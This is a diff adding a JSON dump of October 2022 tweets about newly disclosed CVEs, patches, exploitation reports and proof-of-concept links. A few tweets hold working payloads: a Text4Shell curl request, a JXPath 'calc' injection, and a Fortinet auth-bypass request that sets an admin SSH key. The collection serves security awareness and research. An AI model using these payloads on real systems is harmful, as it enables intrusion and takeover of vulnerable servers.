@@ -1,0 +1,983 @@
+{
+    "tweetfavorites": 465,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 124,
+    "tweettext": "Bug Bounty Tips\n\njQuery XSS Payloads - Part 1\n\n🔹 CVE-2020-11023\n🔹 CVE-2020-11022\n🔹 CVE-2019-11358 https://t.co/0kuBaIqg60",
+    "tweettime": "2022-10-30, 21:11:59",
+    "tweeturl": "https://twitter.com/therceman/status/1586828283294932992",
+    "username": "therceman"
+}
+{
+    "tweetfavorites": 47,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "#Telecom Fibercorp's Cloud Office could have been impacted by the zero-day RCE vulnerability (CVE-2022-41352) in #Zimbra Collaboration Suite. 3,641 email domains hosted in Cloud Office could be affected, including 5 gob[.]ar 🇦🇷 domains 👇...",
+    "tweettime": "2022-10-30, 20:42:44",
+    "tweeturl": "https://twitter.com/_bettercyber_/status/1586820924531085312",
+    "username": "_bettercyber_"
+}
+{
+    "expanded_url": [
+        "https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "Technical Analysis of Windows CLFS Zero-Day Vulnerability CVE-2022-37969 - Part 2: Exploit Analysis https://t.co/v5rMjnscml #Pentesting #Windows  #Exploit #Vulnerability  #CyberSecurity #Infosec https://t.co/LvdLI7pv9b",
+    "tweettime": "2022-10-29, 07:01:19",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1586251818815848450",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part",
+        "https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis"
+    ],
+    "tweetfavorites": 215,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 94,
+    "tweettext": "My new blog series: Technical Analysis of Windows CLFS Zero-Day Vulnerability CVE-2022-37969 - Part 1: Root Cause Analysis https://t.co/WAoH9jkDJ0\nPart 2: Exploit Analysis https://t.co/HAL0XSKf9M\n#0day #exploit #vulnerability #CVE_2022_37969 https://t.co/qbK60MHhv8",
+    "tweettime": "2022-10-28, 17:32:34",
+    "tweeturl": "https://twitter.com/K3vinLuSec/status/1586048292160356354",
+    "username": "K3vinLuSec"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/google-issues-urgent-chrome-update-to.html"
+    ],
+    "tweetfavorites": 192,
+    "tweetquotes": 13,
+    "tweetreplies": 5,
+    "tweetretweets": 139,
+    "tweettext": "⚡ #Google is rolling out an emergency update for the #Chrome browser to patch an actively exploited zero-day #vulnerability (CVE-2022-3723).\n\nRead: https://t.co/arqUfV2VjT\n\n#cybersecurity #technology #infosec #hacking",
+    "tweettime": "2022-10-28, 10:41:16",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1585944782651592704",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://buff.ly/3gbozef",
+        "https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/"
+    ],
+    "tweetfavorites": 188,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 85,
+    "tweettext": "CVE-2022-32250 exploitation writeup by https://t.co/3dvjkq6bTh\nuse-after-free vulnerability in the Netfilter subsystem \n\nhttps://t.co/WhRlqQtsdT \n\n#Linux #kernel #exploit #cve #infosec #cybersecurity #hacking https://t.co/8dLeKblXsu",
+    "tweettime": "2022-10-27, 19:30:13",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1585715511173808133",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/cve-2022-39944-apache-linkis-rce-vulnerability/"
+    ],
+    "tweetfavorites": 50,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 30,
+    "tweettext": "CVE-2022-39944: Apache Linkis RCE Vulnerability https://t.co/1daSgmUsBB",
+    "tweettime": "2022-10-27, 11:57:27",
+    "tweeturl": "https://twitter.com/Dinosn/status/1585601569713692674",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://securitybulldog.com/blog/how-to-find-remediation-instructions-news-to-cve-to-microsoft/"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 3,
+    "tweettext": "Is CVE-2022-42889 important to you? Unless you know that this CVE is the Windows TCP/IP Remote Code Execution vuln and have Microsoft in your IT environment. There is a better way—machine learning: https://t.co/FJ6kpUdsow\n#cybersecurity #microsoft #machinelearning #windows",
+    "tweettime": "2022-10-26, 20:44:35",
+    "tweeturl": "https://twitter.com/SecurityBDog/status/1585371836829044736",
+    "username": "SecurityBDog"
+}
+{
+    "expanded_url": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2022-40684"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 19,
+    "tweettext": "⚠️ CVE-2022-40684 event detected ⚠️\n\nSource IP:\n91.211.16.202 (🇷🇺)\n\nTarget:\nMultiple Fortinet products (FortiOS, FortiProxy, and FortiSwitchManager) vulnerable to authentication bypass (https://t.co/7a0u0A87xM).\n#threatintel",
+    "tweettime": "2022-10-26, 19:50:01",
+    "tweeturl": "https://twitter.com/bad_packets/status/1585358104979439624",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/researchers-release-poc-for-windows-tcp-ip-rce-flaw-cve-2022-34718/"
+    ],
+    "tweetfavorites": 171,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 72,
+    "tweettext": "Researchers Release PoC for Windows TCP/IP RCE Flaw (CVE-2022-34718) https://t.co/E48KL9yzSO",
+    "tweettime": "2022-10-26, 17:51:36",
+    "tweeturl": "https://twitter.com/Dinosn/status/1585328304722411520",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://medium.com/@numencyberlabs/analysis-and-summary-of-tcp-ip-protocol-remote-code-execution-vulnerability-cve-2022-34718-8fcc28538acf"
+    ],
+    "tweetfavorites": 234,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 75,
+    "tweettext": "this is our analysis of the tcpip vulnerability cve-2022-34718 including PoC https://t.co/ZaKkpLlhht",
+    "tweettime": "2022-10-26, 04:55:15",
+    "tweeturl": "https://twitter.com/ma1fan/status/1585132930611154944",
+    "username": "ma1fan"
+}
+{
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 5,
+    "tweettext": "A beautiful collaboration with @steventseeley  leading to Unauthenticated RCE as root, PATCH NOW 🚨\nAlso blog post coming soon 🔥\n\n#vmware\nCVE-2022-31678",
+    "tweettime": "2022-10-25, 20:13:17",
+    "tweeturl": "https://twitter.com/SinSinology/status/1585001574228987904",
+    "username": "SinSinology"
+}
+{
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "#CVE-2022-41828 amazon-redshift-jdbc-driver &lt;=2.1.0.7 RCE https://t.co/41OXv5HwCb",
+    "tweettime": "2022-10-25, 11:38:47",
+    "tweeturl": "https://twitter.com/jas502n/status/1584872093841166341",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-us/HT213489"
+    ],
+    "tweetfavorites": 2003,
+    "tweetquotes": 19,
+    "tweetreplies": 39,
+    "tweetretweets": 188,
+    "tweettext": "I got credited by Apple for a security report!!! ✨✨\n\nNow you know what I was doing that time I took one week off of streaming! 😊\n\nI can't talk about the details yet, but look forward to a stream all about CVE-2022-32947 in the future! 💫\n\nhttps://t.co/UqriYSIeFK https://t.co/igMhNO8yKD",
+    "tweettime": "2022-10-25, 05:33:00",
+    "tweeturl": "https://twitter.com/LinaAsahi/status/1584780043573567488",
+    "username": "LinaAsahi"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/apple-releases-patch-for-new-actively.html"
+    ],
+    "tweetfavorites": 155,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 91,
+    "tweettext": "#Apple releases a security patch for a new, actively exploited #iOS and #iPadOS zero-day #vulnerability (CVE-2022-42827) that allows malicious apps to execute arbitrary code with the highest privileges.\n\nRead: https://t.co/gdkgssdsCc\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-10-25, 03:36:22",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1584750691049869312",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/ko-kr/HT213495"
+    ],
+    "tweetfavorites": 104,
+    "tweetquotes": 0,
+    "tweetreplies": 5,
+    "tweetretweets": 8,
+    "tweettext": "My new Apple Safari Vulnerability :)\n\nUI Spoofing in Apple Safari : CVE-2022-42799 (with @gPayl0ad)\nType confusion in Apple Safari : CVE-2022-42823\nSame-Origin Policy Bypass in Apple Safari : CVE-2022-42824 (with Ryan)\n\nhttps://t.co/7t8VdZoPoh https://t.co/nA28H0X6RT",
+    "tweettime": "2022-10-25, 02:09:24",
+    "tweeturl": "https://twitter.com/l33d0hyun/status/1584728805482336257",
+    "username": "l33d0hyun"
+}
+{
+    "expanded_url": [
+        "https://github.com/ReCryptLLC/CVE-2022-42045"
+    ],
+    "tweetfavorites": 63,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2022-42045 POC : Arbitrary code injection in Zemana amsdk.sys kernel-mode driver, a part of Zemana Antimalware SDK. \n#CVE #infosec #hacktools #cybersecurity #pentesting  https://t.co/vnUIf9yBRa",
+    "tweettime": "2022-10-24, 02:25:20",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1584370428386025477",
+    "username": "sirifu4k1"
+}
+{
+    "tweetfavorites": 185,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 54,
+    "tweettext": "1/ Detect a compromise of a Fortinet firewall with the FortiAnalyzer Event Handler 🔎\n\nA customer affected by CVE-2022-40684 (\"may allow an unauthenticated attacker to perform operations on the administrative interface\" [1]) received the email below. 🧵\n\n#CyberSecurity https://t.co/xHOMRzh2mc",
+    "tweettime": "2022-10-23, 20:01:43",
+    "tweeturl": "https://twitter.com/malmoeb/status/1584273884072665088",
+    "username": "malmoeb"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 9,
+    "tweettext": "Windows TCP/IP Remote Code Execution Vulnerability.\nCVE-2022-34718 \nPoC: https://t.co/seAsYggGuo",
+    "tweettime": "2022-10-23, 11:58:09",
+    "tweeturl": "https://twitter.com/18a/status/1584152191740219392",
+    "username": "18a"
+}
+{
+    "tweetfavorites": 2940,
+    "tweetquotes": 44,
+    "tweetreplies": 53,
+    "tweetretweets": 528,
+    "tweettext": "Remotely exploiting CVE-2022-34718, TCP/IP RCE bug #EvilEsp for DoS. This is a bug in Ipv6 fragmentation/IpSec, which allows OOB write if an Ipv6 fragment is contained inside an IpSec ESP payload. https://t.co/k1aoZX2kWq",
+    "tweettime": "2022-10-22, 03:47:55",
+    "tweeturl": "https://twitter.com/chompie1337/status/1583666434668101637",
+    "username": "chompie1337"
+}
+{
+    "expanded_url": [
+        "https://github.com/NitinYadav00/Exploit-Microsoft-Exchange-Server-"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "Check for Microsoft Exchange servers potentially vulnerable to ProxyNotShell (CVE-2022-40140 &amp; CVE-2022-41082) \ndue to the fact that temporary mitigation is not applied.\n#windows #exchange  https://t.co/OlXLLythpZ",
+    "tweettime": "2022-10-22, 00:03:29",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1583609952668594176",
+    "username": "sirifu4k1"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/hackers-started-exploiting-critical.html"
+    ],
+    "tweetfavorites": 115,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 79,
+    "tweettext": "Researchers have detected active exploitation attempts targeting the recently disclosed critical RCE #vulnerability (CVE-2022-42889) in Apache Commons Text.\n\nRead details: https://t.co/ggzc7VCyC4\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-10-21, 11:04:49",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1583413996043968512",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "http://java.lang.ProcessBuilder.new"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 35,
+    "tweettext": "#CVE-2022-41852 Apache Commons JXPath RCE\n\ncontext.getValue(\"start(https://t.co/FfJNJjYYst('calc'))\")\n\n&lt;dependency&gt;\n    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;\n&lt;/dependency&gt; https://t.co/Ef21QRHX4u",
+    "tweettime": "2022-10-21, 10:46:53",
+    "tweeturl": "https://twitter.com/jas502n/status/1583409480468865024",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://sysdig.com/blog/cve-2022-42889-text4shell/?fbclid=IwAR390dT6t-APZtG9HJiUaWYWY-MARztD_-Z2ggwEbaYngaTaCvXCRar2sk8"
+    ],
+    "tweetfavorites": 106,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 33,
+    "tweettext": "CVE-2022-42889: Apache Commons Text Remote Code Execution.\norg.apache.commons.text.lookup.StringLookup lookups are: - \"script\" - execute expressions using the JVM script execution engine (javax.script) - \"dns\" - resolve dns records - \"url\" ...\n\nPoC\nhttps://t.co/tDxE9oC0i3 https://t.co/X9w67aVQLh",
+    "tweettime": "2022-10-21, 10:40:45",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1583407936763674624",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://sysdig.com/blog/cve-2022-42889-text4shell/?fbclid=IwAR390dT6t-APZtG9HJiUaWYWY-MARztD_-Z2ggwEbaYngaTaCvXCRar2sk8",
+        "https://github.com/ClickCyber/cve-2022-42889"
+    ],
+    "tweetfavorites": 1265,
+    "tweetquotes": 12,
+    "tweetreplies": 13,
+    "tweetretweets": 514,
+    "tweettext": "Apache Text4Shell (CVE-2022-42889)\n\nPoC\ncurl http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.get.Runtime%28%29.exec%28%5C%27%27%2E%74%72%69%6D%28%24%63%6D%64%29%2E%27%5C%27%29%7D\n\nhttps://t.co/WdlwKBOBxZ\nhttps://t.co/KXmFl2VAJf https://t.co/x0WDS8J6rV",
+    "tweettime": "2022-10-21, 05:05:13",
+    "tweeturl": "https://twitter.com/wugeej/status/1583323497681817600",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://github.com/TaroballzChen/CVE-2022-41040-metasploit-ProxyNotShell"
+    ],
+    "tweetfavorites": 62,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 28,
+    "tweettext": "Metasploit script(POC) about CVE-2022-41040. Microsoft Exchange are vulnerable to a server-side request forgery (SSRF) attack. An authenticated attacker can use the vulnerability to elevate privileges.\n\nhttps://t.co/t620czZG8D",
+    "tweettime": "2022-10-20, 10:05:45",
+    "tweeturl": "https://twitter.com/Dinosn/status/1583036740565991425",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/10/19/cve-2022-3236-sophos-firewall-user-portal-and-web-admin-code-injection"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 14,
+    "tweettext": "The latest blog from the researchers at the Trend Micro Research Team looks at CVE-2022-3236: a recently patched bug in #Sophos firewall that is reported to be under active attack. https://t.co/ynBjisbnl1",
+    "tweettime": "2022-10-19, 14:03:49",
+    "tweeturl": "https://twitter.com/thezdi/status/1582734265242251265",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/"
+    ],
+    "tweetfavorites": 62,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 35,
+    "tweettext": "A critical remote code execution (RCE) #vulnerability (CVE-2022-42889) has been discovered in Apache Commons Text.\n\nhttps://t.co/02zX7PVWVS\n\n#infosec",
+    "tweettime": "2022-10-19, 05:34:18",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1582606041606287360",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.oracle.com/security-alerts/cpuoct2022.html"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 26,
+    "tweettext": "My new vulnerability!\n\nCVE-2022-39421: Oracle VirtualBox Remote Code Execution Vulnerability\n\n\"Successful attacks of this vulnerability can result in takeover of Oracle VM VirtualBox.\"\n\nTimeline:\n10-03: Reported to Vendor\n10-18 : Fixed (CVE-2022-39421)\n\nhttps://t.co/60KDG9Muvh https://t.co/pLnMGjwdpA",
+    "tweettime": "2022-10-18, 23:52:53",
+    "tweeturl": "https://twitter.com/l33d0hyun/status/1582520121222115328",
+    "username": "l33d0hyun"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 57,
+    "tweettext": "PoC for CVE-2022-26809 #windows rpc #rce #infosec https://t.co/WsHuQyoB4c",
+    "tweettime": "2022-10-18, 10:43:53",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1582321562740756481",
+    "username": "sirifu4k1"
+}
+{
+    "expanded_url": [
+        "https://lnkd.in/eX88eNE5"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "Here is the thing called #text4shell. Probably the first thing you will care about after waking up tomorrow. CVE-2022-42889 with a CVSS score of 9.8. https://t.co/R7SV6cTLca",
+    "tweettime": "2022-10-18, 05:04:50",
+    "tweeturl": "https://twitter.com/d0znpp/status/1582236237230133250",
+    "username": "d0znpp"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/analysis-rce-vulnerability-cobalt-strike/"
+    ],
+    "tweetfavorites": 36,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 18,
+    "tweettext": "Cobalt Strike 4.7.1远程命令执行漏洞复现过程，带视频演示。复现过程参考了赛博回忆录上月的文章。\n#CVE-2022-39197 https://t.co/4Zt8FJtQSn",
+    "tweettime": "2022-10-18, 03:40:22",
+    "tweeturl": "https://twitter.com/Herdwolfman/status/1582214982552649729",
+    "username": "Herdwolfman"
+}
+{
+    "tweetfavorites": 101,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 42,
+    "tweettext": "#CVE-2022-39197 Cobalt Strike RCE =&lt; 4.7\n\nuse codeql to search exploit chain from the database compiled by openjdk and cobaltstrike4.5 db\n\norg.apache.batik.swing.JSVGCanvas#setURI\norg.apache.batik.bridge.BaseScriptingEnvironment#loadScript https://t.co/iNWnl9yPo2",
+    "tweettime": "2022-10-18, 02:10:10",
+    "tweeturl": "https://twitter.com/jas502n/status/1582192282547392512",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://github.com/sammwyy/CVE-2022-33980-POC"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 1,
+    "tweettext": "Vulnerabilidad RCE en Apache Commons Configuration 2.7 (CVE-2022-33980) \n\nDescubierta unos meses atrás pero olvidé subir el POC.\nhttps://t.co/kTIgKfWAwS https://t.co/2zsctfx19w",
+    "tweettime": "2022-10-17, 21:53:14",
+    "tweeturl": "https://twitter.com/sammwy/status/1582127622490054656",
+    "username": "sammwy"
+}
+{
+    "tweetfavorites": 316,
+    "tweetquotes": 10,
+    "tweetreplies": 3,
+    "tweetretweets": 78,
+    "tweettext": "We are currently investigating CVE-2022-42889, a vulnerability in Apache Commons Text versions 1.5 through 1.9 which can allow RCE when applied to untrusted input due to insecure interpolation defaults.",
+    "tweettime": "2022-10-17, 13:41:42",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1582003925963530242",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/zimbra-releases-patch-for-actively.html"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 29,
+    "tweettext": "Zimbra has finally released security patches for an actively exploited RCE #vulnerability (CVE-2022-41352) in its Enterprise Collaboration Suite that could be used to upload arbitrary files to vulnerable instances.\n\nRead: https://t.co/Tjk1gHjTn0\n\n#infosec #hacking #cybersecurity",
+    "tweettime": "2022-10-17, 09:51:18",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1581945944261607424",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://securityaffairs.co/wordpress/137119/hacking/cve-2022-37969-details.html"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "Experts disclose technical details of now-patched CVE-2022-37969 Windows Zero-Day https://t.co/sllCRwJPNw",
+    "tweettime": "2022-10-15, 06:33:36",
+    "tweeturl": "https://twitter.com/Dinosn/status/1581171412563152897",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.fortiguard.com/psirt/FG-IR-22-377",
+        "https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 24,
+    "tweettext": "Mass scanning activity detected from multiple hosts targeting Fortinet products (FortiOS, FortiProxy, and FortiSwitchManager) vulnerable to authentication bypass (CVE-2022-40684).\n\nVendor advisory: https://t.co/P8qMIksQop\n\nPoC: https://t.co/7xg0yL9DPI\n#threatintel",
+    "tweettime": "2022-10-14, 18:49:00",
+    "tweeturl": "https://twitter.com/bad_packets/status/1580994097271418880",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/10/researchers-reveal-detail-for-windows.html"
+    ],
+    "tweetfavorites": 90,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 54,
+    "tweettext": "Researchers disclose technical details of a Windows zero-day #vulnerability (CVE-2022-37969) in the Common Log File System (CLFS) driver that was under active exploitation last month.\n\nRead: https://t.co/MvqKVG3Jsc\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-10-14, 17:35:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1580975686688247808",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 91,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 45,
+    "tweettext": "Here is my new blog \"Technical Analysis of Windows CLFS Zero-Day Vulnerability CVE-2022-37969 - Part 1: Root Cause Analysis\",  Part 2 will be released soon. Stay tuned!",
+    "tweettime": "2022-10-14, 17:16:14",
+    "tweeturl": "https://twitter.com/K3vinLuSec/status/1580970751028383745",
+    "username": "K3vinLuSec"
+}
+{
+    "tweetfavorites": 32,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 9,
+    "tweettext": "CVE-2022-40684 PoC \n \nPUT /api/v2/cmdb/system/admin/admin HTTP/1.1\n Host: Hostname\nUser-Agent: Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\nContent-Length: 606\n{\n\"ssh-public-key1\": \"key\"\n}",
+    "tweettime": "2022-10-14, 08:57:33",
+    "tweeturl": "https://twitter.com/S0ufi4n3/status/1580845252784443392",
+    "username": "S0ufi4n3"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-34689"
+    ],
+    "tweetfavorites": 142,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 48,
+    "tweettext": "Seen CVE-2022-34689 ? (NSA/NCSC)\n\nWindows CryptoAPI Spoofing Vulnerability\n[...] could manipulate an existing public x.509 certificate to spoof their identify and perform actions [...]\n\n&gt; https://t.co/1RxwiDNZGX\n\nSeems bad enough for Microsoft to release a version for Windows 7 https://t.co/jpgu1zZjrN",
+    "tweettime": "2022-10-13, 21:52:45",
+    "tweeturl": "https://twitter.com/gentilkiwi/status/1580677951481577473",
+    "username": "gentilkiwi"
+}
+{
+    "tweetfavorites": 283,
+    "tweetquotes": 14,
+    "tweetreplies": 6,
+    "tweetretweets": 66,
+    "tweettext": "CVE-2022-22241 is a recently patched preauth phar deserialization vulnerability leading to remote RCE in all #Juniper SSLVPN / JunOS devices. Write-up on this and a bunch of other bugs soon.",
+    "tweettime": "2022-10-13, 18:10:31",
+    "tweeturl": "https://twitter.com/PaulosYibelo/status/1580622023352414208",
+    "username": "PaulosYibelo"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684"
+    ],
+    "tweetfavorites": 877,
+    "tweetquotes": 26,
+    "tweetreplies": 10,
+    "tweetretweets": 370,
+    "tweettext": "Here is our technical deep dive for the #Fortinet CVE-2022-40684 Auth Bypass. POC within. \n\nThis year has been filled with interesting HTTP header abuse!\n\nhttps://t.co/gkg6F7vh2n",
+    "tweettime": "2022-10-13, 16:52:17",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1580602337064030208",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/10/13/2"
+    ],
+    "tweetfavorites": 279,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 103,
+    "tweettext": "Linux kernel WiFi stack bugs exploitable over the air are always worth following up with!\n\nCVE-2022-41674 (RCE)\nCVE-2022-42719 (RCE) &lt;&lt;&lt;\nCVE-2022-42720 (RCE)\nCVE-2022-42721 (DoS)\nCVE-2022-42722 (DoS)\n\nhttps://t.co/mTzRoYfdJW",
+    "tweettime": "2022-10-13, 14:02:11",
+    "tweeturl": "https://twitter.com/hkashfi/status/1580559529007542272",
+    "username": "hkashfi"
+}
+{
+    "expanded_url": [
+        "https://www.pentestpartners.com/security-blog/ms-enterprise-app-management-service-rce-cve-2022-35841/"
+    ],
+    "tweetfavorites": 152,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 58,
+    "tweettext": "Our @_EthicalChaos_ found that you could remotely install Windows Store apps and execute privileged services on the latest versions of Windows. This post has all the juicy CVE-2022-35841 details\nhttps://t.co/R4EyMaidrh\n#rce #cve https://t.co/Jy0Yms6AUj",
+    "tweettime": "2022-10-13, 08:48:29",
+    "tweeturl": "https://twitter.com/PenTestPartners/status/1580480583137779712",
+    "username": "PenTestPartners"
+}
+{
+    "expanded_url": [
+        "https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/"
+    ],
+    "tweetfavorites": 237,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 91,
+    "tweettext": "Linux Kernel Exploit (CVE-2022-32250) with mqueue https://t.co/oLNSdc5aTi",
+    "tweettime": "2022-10-13, 06:46:03",
+    "tweeturl": "https://twitter.com/reverseame/status/1580449772259151873",
+    "username": "reverseame"
+}
+{
+    "tweetfavorites": 31,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "⚠️ CVE-2022-41082 event detected ⚠️\n\nSource IP:\n80.78.25.253 (🇸🇪)\n\nTarget:\nMicrosoft Exchange servers vulnerable to remote code execution.\n#ProxyNotShell #threatintel",
+    "tweettime": "2022-10-12, 22:38:00",
+    "tweeturl": "https://twitter.com/bad_packets/status/1580326950060838913",
+    "username": "bad_packets"
+}
+{
+    "tweetfavorites": 63,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 2,
+    "tweettext": "My Microsoft Word Remote Code Execution Vulnerability CVE-2022-41031 and Microsoft Office Graphics Remote Code Execution Vulnerability CVE-2022-38049 got patched thanks to @msftsecresponse !",
+    "tweettime": "2022-10-12, 10:02:59",
+    "tweeturl": "https://twitter.com/TecR0c/status/1580136942469275648",
+    "username": "TecR0c"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-34689"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 9,
+    "tweettext": "Windows CryptoAPI Spoofing Vulnerability\nCVE-2022-34689\nReport by UK National Cyber Security Centre (NCSC) and the National Security Agency (NSA)\nhttps://t.co/mJRbEyOW7I https://t.co/z75kNVAexi",
+    "tweettime": "2022-10-12, 08:26:14",
+    "tweeturl": "https://twitter.com/blackorbird/status/1580112593817305088",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/fortinet-iocs-cve-2022-40684/"
+    ],
